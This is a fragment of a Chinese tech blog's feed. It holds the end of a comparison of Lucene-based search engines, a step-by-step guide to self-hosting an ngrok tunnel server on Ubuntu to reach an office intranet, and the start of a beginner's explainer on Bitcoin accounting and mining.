id="其他基于Lucene的开源搜索引擎解决方案"><a href="#其他基于Lucene的开源搜索引擎解决方案" class="headerlink" title="其他基于Lucene的开源搜索引擎解决方案"></a>其他基于Lucene的开源搜索引擎解决方案</h2><ul><li><p>直接使用 <a href="http://lucene.apache.org/" target="_blank" rel="noopener">Lucene</a></p><p>  说明：Lucene 是一个 JAVA 搜索类库，它本身并不是一个完整的解决方案，需要额外的开发工作。</p><p>  优点：成熟的解决方案，有很多的成功案例。apache 顶级项目，正在持续快速的进步。庞大而活跃的开发社区，大量的开发人员。它只是一个类库，有足够的定制和优化空间：经过简单定制，就可以满足绝大部分常见的需求；经过优化，可以支持 10亿+ 量级的搜索。</p><p>  缺点：需要额外的开发工作。所有的扩展，分布式，可靠性等都需要自己实现；非实时，从建索引到可以搜索中间有一个时间延迟，而当前的“近实时”(Lucene Near Real Time search)搜索方案的可扩展性有待进一步完善</p></li><li><p><a href="http://katta.sourceforge.net/" target="_blank" rel="noopener">Katta</a></p><p>  说明：基于 Lucene 的，支持分布式，可扩展，具有容错功能，准实时的搜索方案。</p><p>  优点：开箱即用，可以与 Hadoop 配合实现分布式。具备扩展和容错机制。</p><p>  缺点：只是搜索方案，建索引部分还是需要自己实现。在搜索功能上，只实现了最基本的需求。成功案例较少，项目的成熟度稍微差一些。因为需要支持分布式，对于一些复杂的查询需求，定制的难度会比较大。</p></li><li><p><a href="http://svn.apache.org/repos/asf/hadoop/mapreduce/trunk/src/contrib/index/README" target="_blank" rel="noopener">Hadoop contrib/index</a></p><p>  说明：Map/Reduce 模式的，分布式建索引方案，可以跟 Katta 配合使用。</p><p>  优点：分布式建索引，具备可扩展性。</p><p>  缺点：只是建索引方案，不包括搜索实现。工作在批处理模式，对实时搜索的支持不佳。</p></li><li><p><a href="http://sna-projects.com/" target="_blank" rel="noopener">LinkedIn 的开源方案</a></p><p>  说明：基于 Lucene 的一系列解决方案，包括 准实时搜索 zoie ，facet 搜索实现 bobo ，机器学习算法 decomposer ，摘要存储库 krati ，数据库模式包装 sensei 等等</p><p>  优点：经过验证的解决方案，支持分布式，可扩展，丰富的功能实现</p><p>  缺点：与 linkedin 公司的联系太紧密，可定制性比较差</p></li><li><p><a href="https://github.com/tjake/Lucandra" target="_blank" rel="noopener">Lucandra</a></p><p>  说明：基于 Lucene，索引存在 cassandra 数据库中</p><p>  优点：参考 cassandra 的优点</p><p>  缺点：参考 cassandra 的缺点。另外，这只是一个 demo，没有经过大量验证</p></li><li><p><a href="https://github.com/akkumar/hbasene" target="_blank" rel="noopener">HBasene</a></p><p>  说明：基于 Lucene，索引存在 HBase 数据库中</p><p>  优点：参考 HBase 的优点</p><p>  缺点：参考 HBase 的缺点。另外，在实现中，lucene terms 是存成行，但每个 term 对应的 posting lists 是以列的方式存储的。随着单个 term 的 posting lists 的增大，查询时的速度受到的影响会非常大</p></li></ul><p>原文： <a href="http://i.zhcy.tk/blog/elasticsearchyu-solr/" target="_blank" rel="noopener">http://i.zhcy.tk/blog/elasticsearchyu-solr/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Elasticsearch简介&quot;&gt;&lt;a href=&quot;#Elasticsearch简介&quot; class=&quot;headerlink&quot; title=&quot;Elasticsearch简介&quot;&gt;&lt;/a&gt;Elasticsearch简介&lt;/h2&gt;&lt;p&gt;Elasticsearch是一个实时
      
    
    </summary>
    
      <category term="转载" scheme="https://www.love4026.org/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
      <category term="elasticsearch" scheme="https://www.love4026.org/tags/elasticsearch/"/>
    
      <category term="solr" scheme="https://www.love4026.org/tags/solr/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu下搭建ngrok 服务实现内网穿透</title>
    <link href="https://www.love4026.org/316026/ubuntu-create-self-server-ngrok/"/>
    <id>https://www.love4026.org/316026/ubuntu-create-self-server-ngrok/</id>
    <published>2018-03-15T13:05:55.000Z</published>
    <updated>2019-02-07T14:01:38.535Z</updated>
    
    <content type="html"><![CDATA[<p>今天来郑州公司迁移 Google AdWords API 系统，想在上海访问这边的内网，这边是没有固定 IP的，这边就用到了内网穿透利器ngrok 了，这个东西微信开发也会用到。</p><p>ngrok官网的服务因为服务器在国外，所以不是很稳定，我们可以通过开源的代码自己搭建一个ngrok服务器。 下面是主要的操作步骤：</p><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>安装golang及相关依赖</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">sudo</span> apt-<span class="meta">get</span> install <span class="keyword">build-essential </span>golang mercurial git</span><br></pre></td></tr></table></figure><p>先进入到自己想安装的目录，并从github clone ngrok的项目</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/tutumcloud/ngrok.git ngrok</span><br><span class="line">cd ngrok/</span><br></pre></td></tr></table></figure><p>通过以下命令生成并替换源码里默认的证书，注意域名xxxx.com修改为你自己的。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NGROK_DOMAIN=<span class="string">"test.lanthy.com"</span></span><br><span class="line">openssl genrsa -out base<span class="selector-class">.key</span> <span class="number">2048</span></span><br><span class="line">openssl req -new -x509 -nodes -key base<span class="selector-class">.key</span> -days <span class="number">10000</span> -subj <span class="string">"/CN=$NGROK_DOMAIN"</span> -out base.pem</span><br><span class="line">openssl genrsa -out server<span class="selector-class">.key</span> <span class="number">2048</span></span><br><span class="line">openssl req -new -key server<span class="selector-class">.key</span> -subj <span class="string">"/CN=$NGROK_DOMAIN"</span> -out server.csr</span><br><span class="line">openssl x509 -req -<span class="keyword">in</span> server<span class="selector-class">.csr</span> -CA base<span class="selector-class">.pem</span> -CAkey base<span class="selector-class">.key</span> -CAcreateserial -days <span class="number">10000</span> -out server.crt</span><br><span class="line">cp base<span class="selector-class">.pem</span> assets/client/tls/ngrokroot.crt</span><br></pre></td></tr></table></figure><h2 id="编译服务端"><a href="#编译服务端" class="headerlink" title="编译服务端"></a>编译服务端</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make <span class="keyword">release</span>-<span class="keyword">server</span></span><br></pre></td></tr></table></figure><p>如果一切正常，<code>ngrok/bin</code> 目录下应该有 ngrokd 文件</p><p>通过以下命令启动服务：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ngrok/</span><br><span class="line">sudo ./bin/ngrokd <span class="attribute">-tlsKey</span>=server.key <span class="attribute">-tlsCrt</span>=server.crt <span class="attribute">-domain</span>=<span class="string">"sub.lanthy.com"</span> <span class="attribute">-httpAddr</span>=<span class="string">":8081"</span> <span class="attribute">-httpsAddr</span>=<span class="string">":8082"</span></span><br></pre></td></tr></table></figure><p>其中httpAddr、httpsAddr 分别是 ngrok 用来转发 http、https 服务的端口，可以随意指定。同时ngrokd 还会开一个 4443 端口用来跟客户端通讯（可通过 -tunnelAddr=”:xxx” 指定）。</p><p>这里如果你的服务器配置了iptables规则，需要对外开放使用到的端口，可以本地telnet相应的端口看是否可用，不可用可以通过以下的命令开启：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/sbin/iptables</span> -I INPUT -p tcp <span class="params">--dport</span> 8081 -j ACCEPT</span><br><span class="line"><span class="string">/sbin/iptables</span> -I INPUT -p tcp <span class="params">--dport</span> 8082 -j ACCEPT</span><br><span class="line"><span class="string">/sbin/iptables</span> -I INPUT -p tcp <span class="params">--dport</span> 4443 -j ACCEPT</span><br><span class="line"><span class="string">/etc/rc.d/init.d/iptables</span> save</span><br><span class="line"><span class="string">/etc/rc.d/init.d/iptables</span> restart</span><br><span class="line"><span class="string">/etc/init.d/iptables</span> status</span><br></pre></td></tr></table></figure><p>接下来就是需要在自己的域名提供商那里做域名映射了，这里最好把域名泛解析到相应的服务器：</p><p>*.lanthy.com</p><p>然后启动后，通过浏览器访问 test.lanthy.com:8081 如果页面显示</p><pre><code>Tunnel test.lanthy.com:8081 not found</code></pre><p>表示启动成功，可以用客户端连接了。</p><h2 id="编译客户端"><a href="#编译客户端" class="headerlink" title="编译客户端"></a>编译客户端</h2><h3 id="编译linux客户端"><a href="#编译linux客户端" class="headerlink" title="编译linux客户端"></a>编译linux客户端</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make <span class="keyword">release</span>-<span class="keyword">client</span></span><br></pre></td></tr></table></figure><p>编译后会在<code>ngrok/bin</code> 目录下有 ngrok 文件。</p><h3 id="编译Mac客户端"><a href="#编译Mac客户端" class="headerlink" title="编译Mac客户端"></a>编译Mac客户端</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="attribute">GOOS</span>=darwin <span class="attribute">GOARCH</span>=amd64 make release-client</span><br></pre></td></tr></table></figure><p>编译后会在<code>ngrok/bin/darwin_amd64</code> 目录下有 ngrok 文件。</p><h3 id="编译windows客户端"><a href="#编译windows客户端" class="headerlink" title="编译windows客户端"></a>编译windows客户端</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="attribute">GOOS</span>=windows <span class="attribute">GOARCH</span>=amd64 make release-client</span><br></pre></td></tr></table></figure><p>编译后会在<code>ngrok/bin/windows_amd64</code> 目录下有 ngrok.exe 文件。</p><h2 id="运行测试客户端"><a href="#运行测试客户端" class="headerlink" title="运行测试客户端"></a>运行测试客户端</h2><p>将以上的不同系统版本的客户端下载到相应系统后，同一目录新增配置文件ngrok.cfg：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">server_addr:</span> test.lanthy.<span class="string">com:</span><span class="number">4443</span></span><br><span class="line"><span class="string">trust_host_root_certs:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>Mac上执行客户端</p><p>映射本地8080端口，自定义子域名test，通过终端执行以下命令：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ngrok -<span class="keyword">subdomain </span><span class="keyword">sub </span>-config<span class="symbol">=ngrok</span>.cfg <span class="number">8080</span></span><br></pre></td></tr></table></figure><p>Windows上执行客户端：</p><p>映射本地8090端口，自定义子域名test，通过DOS界面进入grok客户端的相应目录:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ngrok <span class="attribute">-config</span>=ngrok.cfg <span class="attribute">-subdomain</span>=sub 8080</span><br></pre></td></tr></table></figure><p>如果连接成功，会出现大概以下内容：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ngrok                                           (Ctrl+C to quit)</span><br><span class="line">                     </span><br><span class="line">Tunnel Status                 online                                            </span><br><span class="line">Version                       <span class="number">1.7</span>/<span class="number">1.7</span>                                           </span><br><span class="line">Forwarding                    http://<span class="keyword">sub</span>.test.lanthy.com:<span class="number">8081</span> -&gt; <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">8080</span>      </span><br><span class="line">Forwarding                    https://<span class="keyword">sub</span>.test.lanthy.com:<span class="number">8082</span> -&gt; <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">8080</span>     </span><br><span class="line">Web Interface                 <span class="number">127.0</span><span class="meta">.0</span><span class="meta">.1</span>:<span class="number">4040</span>              </span><br><span class="line">            </span><br><span class="line">  # Conn                        <span class="number">0</span>                                                 </span><br><span class="line">Avg Conn Time                 <span class="number">0.</span>00ms</span><br></pre></td></tr></table></figure><p>SSH 22端口映射</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/ngrok/bin/ngrok <span class="attribute">-config</span>=/root/ngrok/.ngrok <span class="attribute">-subdomain</span>=test <span class="attribute">--proto</span>=tcp 22</span><br></pre></td></tr></table></figure><pre><code>使用tcp协议穿透，就不会分配2级域名，改为监控一个随机端口,如 test.lanthy.com:12389</code></pre><p>HTTP 80端口映射</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/root/</span>ngrok<span class="meta-keyword">/bin/</span>ngrok -config=<span class="meta-keyword">/root/</span>ngrok/.ngrok -subdomain=<span class="string">"sub"</span> <span class="number">80</span></span><br></pre></td></tr></table></figure><p>后台运行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/ngrok/bin/ngrok <span class="attribute">-config</span>=/root/ngrok/.ngrok <span class="attribute">-subdomain</span>=sub <span class="attribute">--proto</span>=tcp <span class="attribute">-log</span>=stdout 22 &gt; /dev/<span class="literal">null</span> &amp;</span><br></pre></td></tr></table></figure><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://juejin.im/entry/58adb743b123db006730e691" target="_blank" rel="noopener">https://juejin.im/entry/58adb743b123db006730e691</a><br><a href="https://yii.im/posts/pretty-self-hosted-ngrokd/" target="_blank" rel="noopener">https://yii.im/posts/pretty-self-hosted-ngrokd/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天来郑州公司迁移 Google AdWords API 系统，想在上海访问这边的内网，这边是没有固定 IP的，这边就用到了内网穿透利器ngrok 了，这个东西微信开发也会用到。&lt;/p&gt;
&lt;p&gt;ngrok官网的服务因为服务器在国外，所以不是很稳定，我们可以通过开源的代码自己
      
    
    </summary>
    
      <category term="技术" scheme="https://www.love4026.org/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ubuntu" scheme="https://www.love4026.org/tags/ubuntu/"/>
    
      <category term="ngrok" scheme="https://www.love4026.org/tags/ngrok/"/>
    
  </entry>
  
  <entry>
    <title>看完你就知道什么是比特币了</title>
    <link href="https://www.love4026.org/316022/what-is-bitcoin/"/>
    <id>https://www.love4026.org/316022/what-is-bitcoin/</id>
    <published>2018-03-07T07:27:07.000Z</published>
    <updated>2019-02-07T14:01:38.535Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://user-gold-cdn.xitu.io/2018/1/7/160d129fe08810ee" alt="什么是比特币？"></p><h2 id="什么是比特币？"><a href="#什么是比特币？" class="headerlink" title="什么是比特币？"></a>什么是比特币？</h2><p>比特币 (bitcoin) 是一种数字货币。</p><pre><code>小知识：什么是比特(bit) ?bit 是计算机表示二进制的单位。例如：1bit 可以表示 0 或者 1 两种状态；2bit 可以表示 00/01/10/11 四种状态。所以，习惯上人们用比特来形容数字化相关的事物，例如：比特币</code></pre><p>既然比特币是一种数字货币，那么理解比特币之前，先要了解：什么是<code>货币</code>？</p><p>经济学上认为，货币本质上是<code>一般等价物</code>。</p><p>什么是一般等价物？</p><p>考虑原始时代的经济：</p><p>A 圈养了一头牛，B 纺织了一块布，为了满足彼此的需求，他们可以约定：</p><pre><code>一头牛 换 一匹布</code></pre><p>通过这种原始的<code>物物交换</code>实现了简单的<code>价值流动</code>。</p><p>但是，随着社会生产力的提高，这种模式已经不能适应经济发展的要求。</p><pre><code>小思考：为什么物物交换行不通？1、A 在安阳，B 在梅州，空间上没法物物交换；2、A 今天生产了商品甲，下个月才需要商品乙，时间上没法物物交换；3、参与市场的各方提供了成千上万的商品，效率上不接受物物交换。</code></pre><p>这个时候，需要一种各方都认可的<code>一般等价物</code>来衡量、转换和传递商品的价值，从而实现商品的高效自由流动。</p><pre><code>价值流动：商品 -&gt; 一般等价物 -&gt; 商品</code></pre><p>早期，人们使用贝壳来充当<code>一般等价物</code>，后来又使用金、银等贵金属，再发展出纸币，甚至到现在的移动支付。</p><pre><code>小思考：财、货、贵、贩、赚、账、赁，这些字有什么共同点？</code></pre><p>以 ￥人民币 为例，它是以国家信用为背书，充当价值媒介的一般等价物。具有价值尺度、流通手段、贮藏手段、支付手段等职能。</p><p>所以，货币本质上是一般等价物。</p><p>只要你能创造出一种东西：它满足充当一般等价物的条件，那么你就是创造了一种货币！</p><pre><code>小思考：充当一般等价物需要哪些条件？1、全体参与方认可；2、不可伪造；3、方便携带、分隔、可以长期保存；4、数量可控；......</code></pre><p>比特币就是这样一种东西。</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/8/160d5afb3792be0d" alt="比特币"></p><p>这是一个革命性的创举，它打破了古今中外的惯例：货币都由政府的中央银行负责发行，而且只能在特定国家或地区流通。</p><p>要知道，往往只有改朝换代的时候有机会发行全新的货币，可谓百年难遇。现在比特币做到了，而且是全球性地发行和流通，前无古人！</p><h2 id="当前的货币体系"><a href="#当前的货币体系" class="headerlink" title="当前的货币体系"></a>当前的货币体系</h2><p>政府通过国家信用和强制手段保证央行发行的货币被广泛认可和接受。</p><p>例如，通过颁布法律和规章制度：《中华人民共和国中国人民银行法》、《中华人民共和国人民币管理条例》等。</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/8/160d5934991362e3" alt=""></p><p>对于防止伪造，一方面通过技术手段提高纸币的伪造难度；另一方面通过法律手段打击制造、流通假币。</p><p>截至目前，通过央行发行货币是全世界通用的做法，运行良好，但缺点明显。</p><p>显而易见的问题，包括但不限于：</p><ol><li><p>由于发行权掌握在中心化的央行手中，理论上存在货币超发的可能，从而导致通货膨胀，例如：委内瑞拉、津巴布韦等国家由于通货膨胀，货币体系近乎崩溃；</p></li><li><p>即使高压打击，依然无法避免假币出现，最薄弱的环节不在于印制技术，而在于流通中需要人去辨别，而人往往是不可靠的。</p></li></ol><p><img src="https://user-gold-cdn.xitu.io/2018/1/8/160d5b5aca4c1df7" alt=""></p><h2 id="比特币系统是如何运转的？"><a href="#比特币系统是如何运转的？" class="headerlink" title="比特币系统是如何运转的？"></a>比特币系统是如何运转的？</h2><p>2008 年，一个网名为中本聪 (Satoshi Nakamoto) 的人，发表了<a href="https://bitcoin.org/bitcoin.pdf" target="_blank" rel="noopener">《比特币：一种点对点式的电子现金系统》</a>的论文，由此掀开了比特币风靡全球的大幕。</p><pre><code>小链接：论文 PDF 版原文：https://bitcoin.org/bitcoin.pdf中文翻译： [比特币白皮书：一种点对点的电子现金系统](http://www.8btc.com/wiki/bitcoin-a-peer-to-peer-electronic-cash-system)</code></pre><p>由于思维定势，刚接触比特币概念的人，往往有一些认知的误区或盲区：</p><p>1、比特币是不是和硬币或纸币一样有实体形式？<br>2、比特币是数字货币，是不是和银行账户一样，在某个服务器的数据库里记录着我的账户下有多少余额？<br>3、两个人之间怎么转账？是不是和传统的银行一样：A 的账户 -100，B 的账户 +100？<br>4、比特币的数量有多少？最小分割单位是多少？<br>5、没有中央银行，那么比特币是谁发行的？<br>6、软件、音乐、文档等数字资产可以随便复制，为什么比特币不能拷贝？</p><p>……</p><p>一大堆问题！是什么？！为什么？！</p><p>当你开始思考这些问题的时候，那么恭喜你，你已经在思考如何设计一种货币系统了。</p><p>真是激动人心，从来没有想过有一天自己也可以设计一套货币系统，而且可以在真实世界运行起来。</p><p>更令人兴奋的是，你有机会参与价值的重新分配，就像淘金。</p><p>接下来，开始揭秘比特币是如何运行的。</p><a id="more"></a><h3 id="从记账开始"><a href="#从记账开始" class="headerlink" title="从记账开始"></a>从记账开始</h3><p>比特币系统不需要一个具体的地方记录某个账户下有多少余额，只要知道所有账户之间的转账记录，就可以推算出某个账户下有多少余额。</p><p>假设系统总共有 3 个账户 A/B/C，它们初始值和转账记录如下：</p><pre><code>A B C 账户初始值分别为 50元、0元、0元</code></pre><p>转账记录：</p><pre><code>A -&gt; B : 10元B -&gt; C : 5元C -&gt; A : 2元B -&gt; A : 3元</code></pre><p>那么，可以计算出 A/B/C 目前的余额分别是：</p><pre><code>A: 50 - 10 + 2 + 3 = 45元B: 0 + 10 - 5 - 3 = 2元C: 0 + 5 - 2 = 3元</code></pre><p><strong>所以：只要知道转账记录，就可以知道账户余额</strong></p><p>前提是，你要知道所有账户的初始值。</p><p>额… 结果还是有某个地方记录着 A/B/C 的初始值为 50/0/0，说好的比特币不用记录每个账户的余额呢？！</p><p>怎么解决？</p><p>只要规定每个账户初始余额都是 0 ，不就可以不用记录了么！</p><p>都是 0 ？那后来 A 的 50元 哪里来的？没有这 50 ，哪来后续的转账？总不能无中生有吧？？</p><p>答案确实是：无中生有。</p><p>现在，A/B/C 账户的余额都是 0，所以不用记录了，但是多了一笔“无中生有”的转账记录：</p><pre><code>-&gt; A : 50元（无中生有）A -&gt; B : 10元B -&gt; C : 5元C -&gt; A : 2元B -&gt; A : 3元</code></pre><p>那么，可以计算出 A/B/C 目前的余额分别是：</p><pre><code>A: 0 + 50 - 10 + 2 + 3 = 45元B: 0 + 10 - 5 - 3 = 2元C: 0 + 5 - 2 = 3元</code></pre><p>结论依然是：只要知道转账记录，就可以知道账户余额。</p><p>凭什么？！</p><p>凭什么无中生有的时候，到了 A 的账户下，而不是我的，或者至少是所有人平均？！</p><p>想想吧，A 发现了一座疑似金矿，他 费时费力、千辛万苦、冒着万一不是金矿或者发生矿难的风险 开采完，最终总共得到了 50 克黄金。</p><p>这个时候，你还会说凭什么么？不会的。</p><p>当 A 拿 10 克 黄金向 B 买一份腌面的时候，转账发生了：</p><pre><code>-&gt; A : 50A -&gt; B : 10...</code></pre><p>所以，无中生有的成本是：A 要成为一名矿工，去挖矿。</p><p>而 A 的所得是系统对他的奖励，毕竟没人挖矿的话，市场上就没有支持价值流动的媒介：一般等价物。</p><p>这也是比特币唯一的发行方式：矿工每完成一次有效“挖矿”，就奖励一定数量的比特币。</p><p>同时，“挖矿”会设置一定的难度，保证每次“挖矿”时间在 10 分钟左右。</p><p>最开始的时候，每次奖励 50 个比特币，每过 4 年时间奖励减半：</p><pre><code>2009 - 2012 年，每次奖励 50 btc2013 - 2016 年，每次奖励 25 btc2017 - 2020 年，每次奖励 12.5 btc...</code></pre><p>按照这样的规则，时间线到 2140 年左右，奖励会变为 0，那时候问世的比特币总量约 2100 万个。</p><p>所以，你现在就参加挖矿的话，每次可以奖励到 12.5 个比特币，根据比特币交易所 coinbase.com 的最新数据：1btc = $14907，那么 12.5 个比特币约合人民币 ￥1210802，心动不？</p><p>比特币价格变化曲线：</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/8/160d5fcd00648bc5" alt=""></p><h3 id="挖矿吧！少年"><a href="#挖矿吧！少年" class="headerlink" title="挖矿吧！少年"></a>挖矿吧！少年</h3><p>事实上，“挖矿”只是一个形象的比喻。比特币作为一种数字货币，并不像黄金一样要开着挖掘机一勺一勺的挖。</p><p>上文说到，“无中生有”是对“矿工”辛苦“挖矿”付出成本的一种奖励，随着奖励的不断进行，这些“矿工”的账户上也就不断地有比特币增加，然后“矿工”们向其他人支付或者转账，那么货币系统就开始运行起来了。</p><p>既然不用真的去挖，那么哪来的成本？</p><p>你说对了，目前看起来确实没有成本。</p><p>那怎么办？</p><p>解决方案是：人为的制造成本！</p><p>比特币系统给每个“矿工”布置一道作业题，谁先解答出来，就算谁“挖矿”成功，然后奖励就花落他家。</p><p>到底是什么样的作业题，要计算机花大约 10 分钟才能解答出来？</p><p>答案类似于“抽奖”。</p><p>给你 1-10 个号码，随机从中抽一个，放回后可以重复任意次，谁先抽到 “小于等于 N”的号码，就算解答成功。</p><pre><code>那么：对于题目“抽到号码小于等于 10”，那么平均抽 10/10=1 次，就能出现；对于题目“抽到号码小于等于 5”，那么平均抽 10/5=2 次，就能出现；对于题目“抽到号码小于等于 2”，那么平均抽 10/2=5 次，就能出现；...可见 N 的值越小，需要抽的次数就越多</code></pre><p>是不是很简单？以计算机的速度，别说抽 10 次，就算抽 100 万次也是分分钟搞定的事情。感觉我也能“挖矿”，马上就要一夜暴富了，哈哈哈。</p><p>你高兴的太早了。</p><p>如果改为从 1 到 2的256次方 之间抽一个呢？</p><pre><code>2^256 = 1157920892373161954235709850086879078532699846656405640394575840079131296399362的256次方 是一个很大的数字！用 16 进制来表示就是：从 0x0000000000000000000000000000000000000000000000000000000000000000到 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff如果现在要求抽到一个小于等于：0x00000000ffff0000000000000000000000000000000000000000000000000000的数。那么平均需要 4295032833(约 43 亿)次。</code></pre><p>所以，事情没有你想象的那么简单。</p><p>目前，“挖矿”已经是一个竞争激烈残酷到不忍直视的工作。</p><p>比特币系统为了保证每次挖矿时间大约为 10 分钟，会根据过去 2016 次挖矿的平均时间，动态调整 N 的大小。</p><pre><code>小思考：为什么是 2016 次？如果 10 分钟可以挖一次，那么每小时 6 次 x 一天 24 小时 x 14 天(2 周) = 2016 次</code></pre><p>N 越小，需要计算的次数就越多，那么时间也就越长。</p><p>如果“矿工”投入了计算速度超快的设备，也就是传说中的“矿机”，甚至使用成千上万的“矿机”的联合体，也就是更可怕的“矿场”。</p><p>直至终极形态：由无数的个体户和“矿场”等联合，形成“矿池”！那么，计算能力不断增强，为了保证计算时间稳定在 10 分钟左右，N 的值就得不断减小。</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/8/160d637fc413969b" alt=""></p><pre><code>小知识：“挖矿”设备变迁史个人电脑 CPU -&gt;  GPU -&gt; FPGA -&gt; ASIC（矿机）-&gt; 矿场 -&gt; 矿池注：专用集成电路（英语：Application-specific integrated circuit，缩写：ASIC）</code></pre><p>根据 btc.com 的统计，目前参与比特币系统“挖矿”的计算能力已经达到：15.23 EH/s！</p><pre><code>15.23 EH/s = 15.23 x 10^18 次哈希计算/每秒</code></pre><p>难度系数也达到了：</p><pre><code>1.93T = 1.93 x 10^12</code></pre><p>难度系数是个相对值：</p><p>以难度系数 1 需要计算 4295032833(约 43 亿)次为基准</p><p>那么，难度系数 1.93T 需要计算：</p><pre><code>4295032833 x 1.93 x 10^12 = 8289413367690000000000 次</code></pre><p><img src="https://user-gold-cdn.xitu.io/2018/1/8/160d643f7acaa623" alt=""></p><p>所以，很遗憾，作为“个体户”，你已经没有参与“挖矿”的机会了，或者说你那点计算能力参与竞争的话，机会有点渺茫，很渺茫的那种渺茫。so sad ;(</p><p>根据 blockchain.info 的统计，目前全球各大矿池算力份额占比如下图所示：</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/13/160ee7bb6d2cd5d0" alt=""></p><p>其中，有超过 70% 的算力分布在中国，真是“勤劳勇敢的中国人”。</p><pre><code>小思考：每台“矿机”背后都要消耗大量的电源，所以为了降低成本，很多“矿场”都选择建在靠近电站的地方。比特币这种人为设置“挖矿”成本的机制，一直被批评人士诟病：造成大量能源的浪费。你觉得有什么好的解决方案呢？</code></pre><blockquote><p>[新闻链接] 腾讯财经：<a href="https://finance.qq.com/a/20180103/021201.htm" target="_blank" rel="noopener">《央行闭门会议讨论对比特币矿场限电 并非关停》</a></p></blockquote><p>现在，你已经对比特币“挖矿”的概念有了感性的认识：付出“辛苦劳动”的成本，获得系统的奖励，这样你的账户上就会“无中生有”多出比特币，然后你用这些“被挖出”的比特币购买商品或服务，给他人支付或转账，那么比特币就开始充当一般等价物的角色，变身为货币。</p><h3 id="现在就去开户"><a href="#现在就去开户" class="headerlink" title="现在就去开户"></a>现在就去开户</h3><p>上文说到，不管你是参与“挖矿”，还是接受比特币支付或者转账，都需要一个属于你的账户。所以，参与到比特币系统的前提是，你要有一个比特币账户。</p><pre><code>小知识：截至 2018 年 1 月，比特币网络上活跃的账户已经超过 2200 万个。</code></pre><p>你以前去银行开户的时候，需要本人带着身份证，填写一大堆信息和签名，甚至需要现场录指纹和拍照，相当繁琐。</p><p>那么，比特币开户需要携带什么材料，到哪个机构去开户呢？</p><p>答案是：不用带任何材料，不用到任何机构，你可以随时随地零成本地开设任意数量的账户！</p><p>这只是比特币货币系统一个小特性而已。从现在开始，你脑海中的思维定势需要被慢慢推翻，直到你完全掌握比特币运行的原理。</p><p>事实上，你只需要一对密钥，分别称为私钥和公钥。</p><p>这对密钥有这样的特性：私钥加密后的信息只有公钥能解密；公钥加密后的信息只有私钥能解密。也就是所谓的“非对称加密”。</p><pre><code>小知识：这也是比特币被称为数字加密货币的原因，整个系统都依赖密码学基础。</code></pre><p>现在，你完全不用关心怎么生成这样一对密钥。因为有专门的软件帮你生成和保管，这种软件被形象地称为“比特币钱包”。</p><p>你可以到 bitcoin.org/coinbase.com/btc.com 等网站下载它们提供的比特币钱包，甚至可以自己编程开发一个。</p><p><img src="https://user-gold-cdn.xitu.io/2018/1/9/160dab8e862a67fd" 